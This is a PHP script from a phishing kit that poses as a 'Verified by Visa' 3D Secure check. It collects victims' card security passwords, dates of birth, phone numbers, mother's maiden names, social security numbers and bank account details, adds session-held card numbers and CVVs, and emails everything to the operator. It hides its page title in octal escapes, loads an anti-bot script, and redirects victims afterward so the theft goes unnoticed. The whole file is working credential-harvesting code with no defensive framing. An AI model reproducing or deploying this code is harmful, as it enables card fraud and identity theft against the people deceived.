<?
session_start();
date_default_timezone_set('GMT');
$time = date('d/m/Y G:i:s');
include('../hyun.php');
include('../../antibots.php');
include('../../email.php'); 
/////////////////////////////////////////////////////////////////////////////////////
//                                                                                 //
//                                       VBV                                       //
//                                                                                 //
/////////////////////////////////////////////////////////////////////////////////////
$INF = $_POST['_3dpass'] && $_POST['dob_1'] && $_POST['dob_2'] && $_POST['dob_3'] && $_POST['phone1'] && $_POST['phone2'];
if (empty($INF)==false) {
$_SESSION['card'] = 'success';
$_SESSION['dob'] = "".$_POST['dob_1']."/".$_POST['dob_2']."/".$_POST['dob_3']."";
if (empty($_POST['ssn_1']) == false) {
$_POST['ssn'] = "".$_POST['ssn_1']."-".$_POST['ssn_2']."-".$_POST['ssn_3']."";
}
$_SESSION['mmn'] = $_POST['mmn'];
$_SESSION['3dpass'] = $_POST['_3dpass'];
$_SESSION['acc'] = $_POST['acc_num'];
if (empty($_POST['sort_1']) == false) {
$_SESSION['srt'] = "".$_POST['sort_1']."-".$_POST['sort_2']."-".$_POST['sort_3']."";}
$_SESSION['tele'] = "+".$_POST['phone1'].$_POST['phone2']."";
$_SESSION['tl1'] = "0".$_POST['phone2']."";
$msg = " 
<html>
<head><meta charset=\"UTF-8\">
</head>
<div style='font-size: 13px;font-family:arial;border-left:1px solid #C2C2C2;border-right:1px solid #C2C2C2'><hr style=\"border-top:1px solid #C2C2C2\">
<center><img width=\"50px\" src=\"http://i.imgur.com/konA54E.png\"><br>
<hr style=\"border-top:1px solid #C2C2C2\">
<b>BILL & PAY</b></center>
<hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px;padding-right:6px\">
 Holder name  = <font style='color:#08559C;'>".$_SESSION['cchn']."</font><br>
 Card number  = <font style='color:#08559C;'>".$_SESSION['ccnum']."</font><br>
 Expiration   = <font style='color:#08559C;'>".$_SESSION['expdate']."</font><br>
 CSC          = <font style='color:#08559C;'>".$_SESSION['cvv2']."</font><br>
 Type         = <font style='color:#08559C;'>".$_SESSION['Brand']."</font><br>
 Credit/Debit = <font style='color:#08559C;'>".$_SESSION['type']."</font><br>
 Level        = <font style='color:#08559C;'>".$_SESSION['category']."</font><br>
 Bank Name      = <font style='color:#08559C;'>".$_SESSION['bank']."</font><br>
 Bank Url       = <font style='color:#08559C;'><a href=".$_SESSION['url']." style='color:#08559C;'>".$_SESSION['url']."</a></font><br>
 <hr style=\"border-top:1px solid #C2C2C2;\">
 Address      = <font style='color:#08559C;'>".$_SESSION['address']."</font><br>
 Country      = <font style='color:#08559C;'>".$_SESSION['cn']."</font><br>
</div>
<hr style=\"border-top:1px solid #C2C2C2\">
<center><b>VBV INFO</b></center>
<hr style=\"border-top:1px solid #C2C2C2\"> 
<div style=\"padding-left:6px\">
3D Secure      = <font style='color:#08559C;'>".$_SESSION['3dpass']."</font><br>
Date Of Birth  = <font style='color:#08559C;'>".$_SESSION['dob']."</font><br>
Phone  = <font style='color:#08559C;'>".$_SESSION['tele']."</font><br>\n";
if (empty($_SESSION['mmn']) == false) {
$msg .= "Mother Name   = ".$_SESSION['mmn']."<br>\n";}
if (empty($_POST['ssn']) == false) {
$msg .= "Social Security Number     = ".$_SESSION['ssn']."<br>\n";}
if (empty($_SESSION['srt']) == false) {
$msg .= "Sort Code     = ".$_SESSION['srt']."<br>\n";}
if (empty($_SESSION['acc']) == false) {
$msg .= "Account Number  = ".$_SESSION['acc']."<br>\n";}
$msg .= "
</div>
<hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px\">
 Browser  = <font style='color:#08559C;'>".$_SESSION['bro']." On ".$_SESSION['os']."</font><br>
</div>
 <hr style=\"border-top:1px solid #C2C2C2\">
<div style=\"padding-left:6px\">
 IP       = <a style=\";color:#08559C\" href=\"http://www.ip-tracker.org/locator/ip-lookup.php?ip=".$_SESSION['ip']."\" >".$_SESSION['ip']."</a><br>
<span style=\"float:right\"> ".$time."</span></div>
<hr style=\"border-top:1px solid #C2C2C2\">
</html></div><br>\n";
    $subject = "  VBV Fresh Mon Pôte ✌ 💖 ♛  [".$_SESSION['ip']."] [".$_SESSION['cn']."]";
    $headers = "From: PaPa Na InformatiQ <rez@nguessan.ci>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
    $headers .= "Content-type: text/html; charset=UTF-8\n";
   @mail($to, $subject, $msg,$headers);
}
?>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="format-detection" content="telephone=no">
<link rel="icon" type="image/png" href="../../files/img/favicon.ico">
<link rel="stylesheet" href="../../files/css/ap.css">
<title><? echo "\123\145\143\165\162\151\164\171\040\101\165\164\150\056"; ?></title>
<script src="../../files/js/jquery.js"></script>
<script type="text/javascript">
	setTimeout(function(){
		window.location.href = "../home<? echo("?websc=_session=".$_SESSION['code_cn']."&".$_SESSION['SESSION'].""); ?>";
	}, 4000); 
</script>
<body style="background: #fff !important">
<div>
<div class="loading_pp"></div>
<div class="lock_icon"></div>
</div>
</body>
